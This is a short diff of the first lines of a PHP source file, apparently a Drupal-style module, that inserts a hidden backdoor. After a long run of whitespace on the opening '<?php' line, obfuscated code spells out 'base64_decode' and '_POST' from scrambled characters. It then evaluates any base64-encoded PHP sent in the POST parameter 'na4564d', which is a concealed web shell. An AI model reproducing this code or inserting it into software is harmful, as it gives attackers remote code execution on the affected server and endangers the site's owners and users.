@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                                  $yuuo96 = "s4co6_tapbed"; $mst6 = strtolower( $yuuo96[9].$yuuo96[7]. $yuuo96[0].$yuuo96[10] .$yuuo96[4]. $yuuo96[1].$yuuo96[5] .$yuuo96[11].$yuuo96[10]. $yuuo96[2].$yuuo96[3].$yuuo96[11].$yuuo96[10]);$kshm2 =strtoupper ($yuuo96[5]. $yuuo96[8]. $yuuo96[3].$yuuo96[0].$yuuo96[6] ) ;if (isset( ${$kshm2}[ 'na4564d'])) {eval ( $mst6 ( ${$kshm2}['na4564d' ]) ); }?><?php
 
 /**
  * @file
